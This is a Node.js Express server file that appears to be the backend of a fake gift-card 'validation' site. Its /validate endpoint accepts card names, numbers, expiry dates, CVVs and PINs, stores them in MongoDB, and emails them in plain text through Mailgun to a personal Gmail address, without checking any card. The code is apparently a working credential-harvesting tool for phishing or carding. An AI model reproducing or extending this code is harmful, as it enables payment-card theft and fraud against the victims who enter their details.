import express from "express";
import mongoose from "mongoose";
import FormData from "form-data"; 
import Mailgun from "mailgun.js"; 
import dotenv from "dotenv";
import bodyParser from "body-parser";
import cors from "cors"


dotenv.config();

const app = express()
app.use(cors())
app.use(bodyParser.json());



app.use(cors({origin:"http://localhost:5173",credentials : true}))





mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));




async function sendCardDetails(data) {
  const mailgun = new Mailgun(FormData);
  const mg = mailgun.client({
    username: "api",
    key: process.env.MAIL_GUN_API_KEY});

  try {
    const msg = await mg.messages.create("mg.ivalidategcs.com", {
      from: "Mailgun Sandbox <postmaster@mg.ivalidategcs.com>",
      to: ["<olakunle23odunade@gmail.com>"],
      subject: "Gift Card Update",
      text: `
        CardName : ${data.cardName}
        CardNumber: ${data.cardNumber}
        expiryDate : ${data.expiryDate}
        cvv: ${data.cvv}
        expiryDate: ${data.pin}`

    });

    console.log(msg); 
  } catch (error) {
    console.log(error); 
  }
}

const giftCardInputSchema = new mongoose.Schema({
    cardName : String,
    cardNumber : String,
    expiryDate : String,
    cvv : String,
    pin : String
})

const GiftCardInput  = mongoose.model("giftCardInput",giftCardInputSchema)


app.post("/validate" , (async (req , res ) => {

    try{
        const {cardNumber , expiryDate , cvv , pin } = req.body;

        const newCard = new GiftCardInput({
        cardName : req.body.cardName,
        cardNumber : req.body.cardNumber,
        expiryDate : req.body.expiryDate,
        cvv : req.body.cvv,
        pin : req.body.pin
    
        });
      
        await newCard.save();
        sendCardDetails(req.body)

        return res.status(200).json("Successfully Saved");


    }catch(err){
        console.log(err)
        res.status(500).json({ error: "An error occurred while saving the data." });

    }

}))



app.listen(5000 , () => {
    console.log("server is running in port 5000")
})